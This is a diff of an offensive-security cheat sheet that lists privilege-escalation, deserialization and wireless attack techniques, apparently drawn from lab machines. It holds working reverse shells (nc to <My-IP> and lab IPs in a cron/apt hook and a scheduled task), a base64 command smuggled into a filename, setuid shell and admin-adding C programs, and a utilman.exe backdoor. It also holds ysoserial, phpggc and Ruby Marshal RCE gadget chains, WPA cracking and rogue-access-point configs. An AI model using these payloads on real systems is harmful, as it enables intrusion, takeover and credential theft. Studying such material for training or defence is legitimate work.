+  # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+  # |  |  |  |  |
+  # *  *  *  *  * user-name  command to be executed 
+  
+  * * * * * root apt-get update
+  * * * * * root /root/run.sh
+  
+  -->
+  ls -ld /etc/apt/apt.conf.d
+  -rwxrwxrwx. 1 root root 1338 Apr 28 13:45 /etc/apt/apt.conf.d
+  bash-4.2$
+  -->
+  echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <My-IP> 1234 >/tmp/f"};' > shell
+  
+  #Other Example:
+  #Running pspy we see a cron running as root.
+  2022/08/22 18:34:01 CMD: UID=0    PID=2147   | /bin/sh -c /bin/bash /usr/bin/clean-tmp.sh 
+  2022/08/22 18:34:01 CMD: UID=0    PID=2149   | /bin/bash /usr/bin/clean-tmp.sh 
+  jane@assignment:~$ cat /usr/bin/clean-tmp.sh 
+  #! /bin/bash
+  find /dev/shm -type f -exec sh -c 'rm {}' \;
+  jane@assignment:/tmp$ touch /dev/shm/'$(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA==|base64 -d|bash)'
+  jane@assignment:/tmp$ bash -p
+  bash-5.0# whoami
+  root
+  
+  #Other Example:
+  #To determine the privileges of the network group, we can use the find command.
+  #We see that we have write access to the /etc/hosts file. We modify the IP address of localhost in the /etc/hosts file to our attacker IP.
+  #we proceed to mount the share onto our attack machine.
+  liam@lunar:~$ find / -xdev -group network 2>/dev/null
+  /etc/hosts
+  
+  liam@lunar:~$ ls -la /etc/hosts
+  -rw-rwxr-- 1 root network 36 Apr 29 20:40 /etc/hosts
+  
+  --> 
+  liam@lunar:~$ cat /etc/hosts
+  #127.0.0.1       localhost
+  192.168.1.99    locahost
+  
+  -->
+  ┌──(kali@kali)-[/tmp/]
+  └─# sleep 60 && mount -t nfs 192.168.1.33:/srv/share /tmp/share
+  
+  ┌──(kali@kali)-[/tmp/]
+  └─# cd share && ls -la
+  
+  drwxrwxrwx  2 root   root       4096 Apr 30 12:29 .
+  drwxrwxrwt 15 root   root      20480 Apr 30 13:39 ..
+  -rw-rw-rw-  1 nobody nogroup 1280255 Apr 30 12:28 web-backup.zip
+  
+  --> create the following bash.c 
+  ┌──(kali@kali)-[/tmp]
+  └─# nano bash.c
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <sys/types.h>
+  #include <unistd.h>
+  
+  int main()
+  {
+  setuid(0);
+  system("/bin/bash");
+  return 0;
+  }
+  
+  -->
+  ┌──(kali@kali)-[/tmp]
+  └─# sudo cp bash share/
+  
+  ┌──(kali@kali)-[/tmp/share]
+  └─# sudo chmod +s bash
+  
+  liam@lunar:/$ cd /srv/share/
+  liam@lunar:/srv/share$ ./bash
+  
+  root@lunar:/srv/share# whoami
+  root
   ```
 
 ### Privilege Escalation Windows (WIN)
-- **Privilege Escalation WIN Example**:
+- **Privilege Escalation WIN most known tricks**:
   ```powershell
-  net localgroup administrators /add user
+  #Getting the version and architecture of the running operating system
+  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+  
+  #Querying the AlwaysInstalledElevated registry values on Windows
+  reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+  reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+  
+  
+  #Getting OS Architecture using wmic
+  wmic os get osarchitecture
+  
+  #Checking the Group Integrity Level
+  whoami /groups
+  
+  #Attempting to change the password
+  net user admin Ev!lpass
+  
+  #Using powershell to spawn a cmd.exe process with high integrity
+  powershell.exe Start-Process cmd.exe -Verb runAs
+  
+  #Listing driver versions on Windows
+  Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+  
+  #Listing loaded drivers on Windows
+  PS > driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
+  
+  #Listing all drives available to mount on Windows
+  mountvol
+  
+  #Checking for reboot and other privileges
+  whoami /priv
+  
+  #Rebooting the machine
+  shutdown /r /t 0
+  
+  #Listing all Unquoted Service Paths
+  wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
+  wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services
+  
+  #Unquoted Service Paths: Other way
+  for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
+  	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
+  		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
+  	)
+  )
+  #To retrieve service accounts hash, we'll use a publicly available tool GMSAPasswordReader
+  *Evil-WinRM* PS C:\Users\enox\Desktop> upload GMSAPasswordReader.exe
+  *Evil-WinRM* PS C:\Users\enox\Desktop> ./GMSAPasswordReader.exe --accountname svc_apache
+  
+  #Listing all installed drivers
+  driverquery /v
+  
+  #Listing all writable files and directories in a specified target using PowerShell
+  PS > Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+  
+  #Listing all writable files and directories in a specified target
+  accesschk.exe -uws "Everyone" "C:\Program Files"
+  
+  #Listing all installed security patches on Windows
+  wmic qfe get Caption, Description, HotFixID, InstalledOn
+  
+  #Listing all installed applications installed on Windows
+  wmic product get name, version, vendor
+  wmic service get name,displayname,pathname,startmode
+  wmic service get name,displayname,pathname,startmode | findstr /i "auto"
+  
+  #Getting services via wmic that are automatically started and non-standard
+  wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
+  
+  #Listing running services on Windows using PowerShell
+  Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+  
+  #Listing all the scheduled tasks on Windows
+  schtasks /query /fo LIST /v
+  
+  # icacls output for the ServiioService.exe service
+  icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
+  
+  #Listing all the firewall rules on Windows
+  netsh advfirewall firewall show rule name=all
+  
+  #Listing the current profile for the firewall on Windows
+  netsh advfirewall show currentprofile
+  
+  #Listing all active network connections on the Windows operating system
+  netstat -ano
+  
+  #Printing the routes on Windows
+  route print
+  
+  #Listing the full TCP/IP configuration on all available adapters on Windows
+  ipconfig /all
+  
+  #Getting a list of running processes on the operating system and matching services
+  tasklist /SVC
+  
+  #Checking user permissions
+  #PrintSpoofer v0.1 or Juicy Potato to get the root shell
+  whoami /priv
+  Output: SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+  .\PS.exe -i -c ".\nc.exe 192.168.119.156 80 -e cmd" --> shell
+  
+  
+  #Tools
+  #https://github.com/pentestmonkey/windows-privesc-check
+  windows-privesc-check2.exe -h
+  windows-privesc-check2.exe --dump -G
+  
+  #Tools
+  #Checking the application manifest of fodhelper.exe using sigcheck.exe
+  SysinternalsSuite --> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+  
+  #Specific exploits:
+  #whoami /priv
+  #SeRestorePrivilege            Restore files and directories  Enabled
+  wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
+  *Evil-WinRM* PS C:\Users\svc_apache$\Documents> upload EnableSeRestorePrivilege.ps1
+  *Evil-WinRM* PS C:\Users\svc_apache$\Documents> ./EnableSeRestorePrivilege.ps1
+  move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+  move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+  $ rdesktop 192.168.120.91--> WIN+U
+  
+  
+  #Tools
+  #gcc for windows with
+  mingw-w64.bat
+  gcc --help
+  
+  
+  #Code
+  #adduser.c code
+  #i686-w64-mingw32-gcc adduser.c -o adduser.exe
+  
+  #include <stdlib.h>
+  
+  int main ()
+  {
+    int i;
+    
+    i = system ("net user evil Ev!lpass /add");
+    i = system ("net localgroup administrators evil /add");
+    
+    return 0;
+  }
+  
+  #Code
+  #Ping sweep internal network
+  for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
+  
+  
+  #Links:
+  #XP
+  C:\Documents and Settings\Administrator\Desktop\
+  
+  #Examples: Priveleges:
+  #https://github.com/itm4n/FullPowers
+  #From this resource, we find out that when a LOCAL SERVICE or NETWORK SERVICE is configured to run with a restricted set of privileges, permissions can be recovered by creating a scheduled task. 
+  
+  PS C:\wamp\www>whoami /priv
+  whoami /priv
+  
+  PRIVILEGES INFORMATION
+  ----------------------
+  
+  Privilege Name                Description                    State   
+  ============================= ============================== ========
+  SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+  SeCreateGlobalPrivilege       Create global objects          Enabled 
+  SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+  
+  -->
+  PS C:\wamp\www> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""
+  -->
+  C:\Windows\system32>whoami /priv
+  whoami /priv
+  
+  PRIVILEGES INFORMATION
+  ----------------------
+  
+  Privilege Name                Description                        State   
+  ============================= ================================== ========
+  SeAssignPrimaryTokenPrivilege Replace a process level token      Disabled
+  SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
+  SeSystemtimePrivilege         Change the system time             Disabled
+  SeAuditPrivilege              Generate security audits           Disabled
+  SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
+  SeCreateGlobalPrivilege       Create global objects              Enabled 
+  SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
+  SeTimeZonePrivilege           Change the time zone               Disabled
+  
+  C:\Windows\system32>
+  
+  -->
+  C:\wamp\www>PrintSpoofer64.exe -i -c "cmd /c whoami"
+  PrintSpoofer64.exe -i -c "cmd /c whoami"
+  [+] Found privilege: SeImpersonatePrivilege
+  [+] Named pipe listening...
+  [+] CreateProcessAsUser() OK
+  nt authority\system
+  
+  #PRIVE-Escalation with TFTP
+  #We notice that the C://Backup/ directory is writeable.
+  #According to this text file, TFTP.EXE is run every five minutes
+  C:\>icacls Backup
+  icacls Backup
+  Backup BUILTIN\Users:(OI)(CI)(F)
+         BUILTIN\Administrators:(I)(OI)(CI)(F)
+         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+         BUILTIN\Users:(I)(OI)(CI)(RX)
+         NT AUTHORITY\Authenticated Users:(I)(M)
+         NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+  
+  Successfully processed 1 files; Failed processing 0 files
+  
+  C:\>
+  
+  -->
+  C:\>cd Backup && dir
+  cd Backup && dir
+   Volume in drive C has no label.
+   Volume Serial Number is 6E11-8C59
+  
+   Directory of C:\Backup
+  
+  06/12/2020  07:45 AM    <DIR>          .
+  06/12/2020  07:45 AM    <DIR>          ..
+  06/12/2020  07:45 AM            11,304 backup.txt
+  06/12/2020  07:45 AM                73 info.txt
+  06/12/2020  07:45 AM            26,112 TFTP.EXE
+                 3 File(s)         37,489 bytes
+                 2 Dir(s)  28,603,658,240 bytes free
+  
+  C:\Backup>type info.txt
+  type info.txt
+  Run every 5 minutes:
+  C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
+  C:\Backup>
+  
+  -->
+  C:\Backup>move evil.exe TFTP.EXE
+  move evil.exe TFTP.EXE
+          1 file(s) moved.
+  
+  -->
+  ┌──(kali㉿kali)-[~]
+  └─$ sudo nc -lvvvp 3306                                                              
+  listening on [any] 3306 ...
+  192.168.68.53: inverse host lookup failed: Host name lookup failure
+  connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49729
+  Microsoft Windows [Version 10.0.18363.900]
+  (c) 2019 Microsoft Corporation. All rights reserved.
+  
+  C:\Windows\system32>whoami
+  whoami
+  slort\administrator
+  
+  #PrivescCheck
+  PS: C:\xampp\htdocs\tmp> Import-Module .\PrivescCheck.ps1
+  
+  PS: C:\xampp\htdocs\tmp> Invoke-PrivescCheck -Extended
   ```
 
 ### Reverse Shells
@@ -5197,10 +6329,102 @@ $exec = system('shell.exe', $val);
 curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
 ```
 ### Serialization and Deserialization
-- **Serialization Example**:
+- **Serialization most known tricks**:
   ```python
-  import pickle
-  data = pickle.dumps({"username": "admin", "password": "password"})
+   //Modifying serialized data types
+  change the following encoded Token:
+  O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"k83d4afws8dk9sou6jn2h48e5klleenm";}
+  TO -->
+  O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+  
+  
+  //Using application functionality to exploit insecure deserialization
+  
+  O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kufol5p36sa7weaj33subd177umbqmn6";s:11:"avatar_link";s:19:"users/wiener/avatar";}
+  
+  TO -->
+  
+  O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kufol5p36sa7weaj33subd177umbqmn6";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+  
+  //Arbitrary object injection in PHP
+  
+  O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"c52wutj0vzz5znns3rf2u20ylzlyptzd";}
+  
+  TO -->
+  
+  O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}	 	//__destruct() magic method is automatically invoked and will delete Carlos's file.
+  
+  //Exploiting Java deserialization with Apache Commons
+  
+  java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+  
+  
+  //Exploiting PHP deserialization with a pre-built gadget chain
+  
+  ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
+  
+  Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6
+  e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBk
+  ZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVt
+  IjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0g
+  L2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hl
+  XEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENh
+  Y2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2Fj
+  aGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21w
+  b25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMi
+  O319Cg==
+  
+  -This will output a valid, signed cookie to the console.
+  <?php
+  $object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
+  $secretKey = "bcgteel0ua49lq7i0qifrywachnipspg";				//The value is in phpinfo site
+  $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+  echo $cookie;
+  
+  
+  //Ruby universal
+  
+  # Autoload the required classes
+  Gem::SpecFetcher
+  Gem::Installer
+  require 'base64'
+  
+  # prevent the payload from running when we Marshal.dump it
+  module Gem
+    class Requirement
+      def marshal_dump
+        [@requirements]
+      end
+    end
+  end
+  
+  wa1 = Net::WriteAdapter.new(Kernel, :system)
+  
+  rs = Gem::RequestSet.allocate
+  rs.instance_variable_set('@sets', wa1)
+  rs.instance_variable_set('@git_set', "id")
+  
+  wa2 = Net::WriteAdapter.new(rs, :resolve)
+  
+  i = Gem::Package::TarReader::Entry.allocate
+  i.instance_variable_set('@read', 0)
+  i.instance_variable_set('@header', "aaa")
+  
+  
+  n = Net::BufferedIO.allocate
+  n.instance_variable_set('@io', i)
+  n.instance_variable_set('@debug_output', wa2)
+  
+  t = Gem::Package::TarReader.allocate
+  t.instance_variable_set('@io', n)
+  
+  r = Gem::Requirement.allocate
+  r.instance_variable_set('@requirements', t)
+  
+  payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+  #puts payload.inspect
+  #puts Marshal.load(payload)
+  puts Base64.encode64(payload)
   ```
 
 ### Shellshock
@@ -5565,9 +6789,642 @@ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
   ```
 
 ### Wireless Vulnerabilities
-- **Wireless Example**:
+- **Wireless most known tricks**:
   ```bash
-  iwlist wlan0 scan
+  #Determining the Wireless Chipset
+  sudo lsusb -vv
+  --> Output: idVendor           0x148f Ralink Technology, Corp.
+      idProduct          0x5370 RT5370 Wireless Adapter
+  
+  #Getting a DHCP lease on wlan0
+  sudo dhclient wlan0
+  
+  #Listing support modes on all wireless interfaces
+  sudo iw list
+  
+  #Setting the IP address to wlan0
+  sudo ip link set wlan0 up
+  sudo ip addr add 10.0.0.1/24 dev wlan0
+  
+  
+  #airmon-ng|iw
+  ###############
+  #Checking for network managers using Airmon-ng
+  sudo airmon-ng check
+  
+  #Killing network managers with Airmon-ng
+  sudo airmon-ng check kill
+  
+  #Airmon-ng enabling monitor mode on wlan0
+  sudo airmon-ng start wlan0
+  
+  #Using --verbose with Airmon-ng
+  sudo airmon-ng --verbose
+  
+  #Using debug with airmon-ng
+  sudo airmon-ng --debug
+  
+  #Airmon-ng enabling monitor mode on wlan0, channel 3
+  sudo airmon-ng start wlan0 3
+  
+  #Checking current channel using iw
+  sudo iw dev wlan0mon info
+  
+  #Using stop option with Airmon-ng
+  sudo airmon-ng stop wlan0mon
+  
+  
+  #airodump-ng
+  ###############
+  #Airodump-ng options
+  #-w prefix	Saves the capture dump to the specified filename
+  #--bssid BSSID	Filters Airodump-ng to only capture the specified BSSID
+  #-c channel(s)	Forces Airodump-ng to only capture the specified channel(s)
+  
+  #Airodump command on a fixed channel
+  sudo airodump-ng wlan0mon -c 2
+  
+  #Airodump-ng focused on a channel and BSSID
+  sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon
+  
+  #executing airodump-ng with the -w option, followed by a filename prefix writes the output to a number of formats
+  sudo airodump-ng --output-format csv,pcap wlan0mon
+  
+  #aireplay-ng
+  ###############
+  #Aireplay-ng injection test
+  sudo airmon-ng start wlan0 3
+  sudo aireplay-ng -9 wlan0mon
+  
+  #Aireplay-ng injection test focused on an ESSID/BSSID
+  sudo aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon
+  
+  #Aireplay-ng card-to-card injection test
+  sudo aireplay-ng -9 -i wlan1mon wlan0mon
+  
+  #aircrack-ng
+  ###############
+  #Benchmark on all CPUs
+  aircrack-ng -S
+  
+  #airdecap-ng
+  ###############
+  #Airdecap-ng removing wireless headers
+  sudo airdecap-ng -b 34:08:04:09:3D:38 opennet-01.cap
+  
+  #airgraph-ng
+  ###############
+  #Let's run Airgraph-ng with the -o option to output to a file name, the -i option to input an Airodump-ng .csv file, and -g to define a CAPR graph
+  #To create this graph with our Airodump-ng .csv file, we'll use the -g CPG option
+  airgraph-ng -o Picture1_png -i dump-01.csv -g CAPR
+  airgraph-ng -o Picture2.png -i dump-01.csv -g CPG
+  
+  #all-together
+  #############
+  #Airodump-ng command and output on channel 3, focused on a BSSID
+  #Deauthenticating client with aireplay
+  #Cracking the The WPA shared key
+  #Using airdecap-ng to decrypt the traffic
+  sudo airodump-ng wlan0mon
+  sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon
+  sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
+  aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
+  airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap
+  
+  #Custom Wordlists with Aircrack-ng
+  ##################################
+  #Listing all lines containing "password"
+  grep -i password /usr/share/john/password.lst
+  
+  #Adding two mangling rules to JtR
+  sudo nano /etc/john/john.conf
+  --> Add two-three numbers to the end of each password 
+  
+  $[0-9]$[0-9]
+  $[0-9]$[0-9]$[0-9]
+  
+  #Testing mangling rules with JtR
+  john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123
+  
+  #Using Crunch to generate wordlist with the charset abc123 with word between 8 and 9 characters
+  crunch 8 9 abc123
+  
+  #Using Crunch to generate wordlist with starting with password and ending with three digits
+  crunch 11 11 -t password%%%
+  
+  #Using Crunch to generate wordlist starting with 'password' and ending with three digits - Alternate version
+  crunch 11 11 0123456789 -t password@@@
+  
+  #Using Crunch to generate wordlist using characters in 'abcde12345' without repeating any of them
+  #The -p option generates unique words from a character set or a set of whole words. Although we still need to provide the minimum and maximum length, those numbers are ignored
+  crunch 1 1 -p abcde12345
+  
+  #Using Crunch to generate wordlist with multiple words instead of characters, without repeating them
+  crunch 1 1 -p dog cat bird
+  
+  #Using Crunch to generate wordlist with multiple words instead of characters, without repeating them and adding two digits
+  crunch 5 5 -t ddd%% -p dog cat bird
+  
+  #Using Crunch to generate a non-repeating wordlist from multiple words and adding two characters from a defined character set
+  crunch 5 5 aADE -t ddd@@ -p dog cat bird
+  
+  #Combining Crunch mangling and piping it to aircrack-ng
+  crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap -w -
+  
+  #Using Aircrack-ng with RSMangler
+  echo bird > wordlist.txt
+  echo cat >> wordlist.txt
+  echo dog >> wordlist.txt
+  rsmangler --file wordlist.txt
+  
+  #RSMangler output to a file
+  rsmangler --file wordlist.txt --output mangled.txt
+  
+  #Concatenated wordlist piped into RSMangler
+  cat wordlist.txt | rsmangler --file -
+  
+  #Mangling wordlist using RSMangler and limiting to 12-13 characters
+  rsmangler --file wordlist.txt --min 12 --max 13
+  
+  #Combining RSMangler mangling and piping it to Aircrack-ng
+  rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w -
+  
+  #Displaying properties of a Skylake CPU using hashcat
+  hashcat -I
+  
+  #Benchmarking the Skylake CPU using hashcat
+  hashcat --help
+  hashcat -b -m 2500
+  
+  #Installing hashcat utilities
+  sudo apt install hashcat-utils
+  
+  #Converting PCAP to hccapx for hashcat
+  #Note that aircrack-ng can also use .hccapx files as input for cracking.
+  /usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
+  
+  #Cracking with hashcat
+  hashcat -m 2500 output.hccapx /usr/share/john/password.lst
+  
+  #Airolib-ng
+  ###########
+  #Adding the target ESSID to a file
+  echo wifu > essid.txt
+  
+  #Importing the ESSID with airolib-ng
+  airolib-ng wifu.sqlite --import essid essid.txt
+  
+  # Viewing the airolib-ng database statistics
+  airolib-ng wifu.sqlite --stats
+  
+  #Importing passwords into the airolib-ng database
+  airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst
+  
+  #Generating the PMKs for the ESSID
+  airolib-ng wifu.sqlite --batch
+  airolib-ng wifu.sqlite --stats
+  
+  #Recovering the WPA password with the airolib-ng database
+  aircrack-ng -r wifu.sqlite wpa1-01.cap
+  
+  #coWPAtty
+  
+  #Creating pre-computed hash tables using genpmk
+  #We run genpmk with -f to define our wordlist, -d to output to a file, and -s to specify the ESSID
+  genpmk -f /usr/share/john/password.lst -d wifuhashes -s wifu
+  
+  #Using pre-computed hashtables with coWPAtty
+  cowpatty -r wpajohn-01.cap -d wifuhashes -s wifu
+  
+  #Attacking WPS
+  ##############
+  #Wash displaying WPS information for each AP
+  wash -i wlan0mon
+  
+  #using reaver to attack our wifu AP. 
+  #We have to specify the BSSID of the AP we gathered earlier using wash with -b, the wireless interface using -i, and a very verbose output with -vv.
+  #Launching attack using reaver
+  sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
+  
+  # Using PixieWPS attack with reaver
+  #One alternative to this method is to use bully with -d, which will attempt to run PixieWPS with the values we recovered from bully
+  sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K
+  
+  
+  #Checking the first three bytes of the BSSID against known PINs
+  sudo apt install airgeddon
+  source /usr/share/airgeddon/known_pins.db
+  echo ${PINDB["0013F7"]}
+  
+  #Rogue Access Points
+  ####################
+  
+  #Discovery via airodump-ng
+  sudo airodump-ng -w discovery --output-format pcap wlan0mon
+  
+  #Building the hostapd-mana Configuration
+  #The simplest configuration for hostapd-mana
+  kali@kali:~$ cat Mostar-mana.conf
+  interface=wlan0
+  ssid=Mostar
+  channel=1
+  
+  #Adding hw_mode to the config file
+  #Adding security configuration
+  #Final Mostar-mana.conf
+  kali@kali:~$ cat Mostar-mana.conf
+  interface=wlan0
+  ssid=Mostar
+  channel=1
+  hw_mode=g
+  ieee80211n=1
+  wpa=3
+  wpa_key_mgmt=WPA-PSK
+  wpa_passphrase=ANYPASSWORD
+  wpa_pairwise=TKIP
+  rsn_pairwise=TKIP CCMP
+  mana_wpaout=/home/kali/mostar.hccapx
+  
+  #Running hostapd-mana
+  sudo hostapd-mana Mostar-mana.conf
+  
+  #Deauthenticating clients
+  sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
+  
+  #Capturing handshakes from deauthenticated clients
+  kali@kali:~$ sudo hostapd-mana Mostar-mana.conf 
+  Configuration file: Mostar-mana.conf
+  MANA: Captured WPA/2 handshakes will be written to file 'mostar.hccapx'.
+  Using interface wlan0 with hwaddr 2e:0b:05:98:f8:66 and ssid "Mostar"
+  wlan0: interface state UNINITIALIZED->ENABLED
+  wlan0: AP-ENABLED 
+  ...
+  MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
+  wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
+  
+  #Cracking the WPA/2 Hash
+  aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
+  
+  
+  #Attacking WPA Enterprise
+  #########################
+  
+  #Airodump-ng command and output
+  sudo airodump-ng wlan0mon
+  
+  #Installing freeradius
+  sudo apt install freeradius
+  
+  #certificate_authority section in ca.cnf
+  kali@kali:~$ sudo -s
+  root@kali:/home/kali# cd /etc/freeradius/3.0/certs
+  root@kali:/etc/freeradius/3.0/certs# nano ca.cnf
+  
+  ...
+  [certificate_authority]
+  countryName             = US
+  stateOrProvinceName     = CA
+  localityName            = San Francisco
+  organizationName        = Playtronics
+  emailAddress            = ca@playtronics.com
+  commonName              = "Playtronics Certificate Authority"
+  ...
+  
+  #server section in server.cnf
+  root@kali:/etc/freeradius/3.0/certs# nano server.cnf
+  
+  ...
+  [server]
+  countryName             = US
+  stateOrProvinceName     = CA
+  localityName            = San Francisco
+  organizationName        = Playtronics
+  emailAddress            = admin@playtronics.com
+  commonName              = "Playtronics"
+  ...
+  
+  #Certificate generation
+  root@kali:/etc/freeradius/3.0/certs# rm dh
+  root@kali:/etc/freeradius/3.0/certs# make
+  
+  #HostAPd configuration file, mana.conf
+  #up to --> EOF
+  # SSID of the AP
+  ssid=Playtronics
+  # Network interface to use and driver type
+  # We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
+  interface=wlan0
+  driver=nl80211
+  # Channel and mode
+  # Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
+  channel=1
+  # Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+  hw_mode=g
+  # Setting up hostapd as an EAP server
+  ieee8021x=1
+  eap_server=1
+  # Key workaround for Win XP
+  eapol_key_index_workaround=0
+  # EAP user file we created earlier
+  eap_user_file=/etc/hostapd-mana/mana.eap_user
+  # Certificate paths created earlier
+  ca_cert=/etc/freeradius/3.0/certs/ca.pem
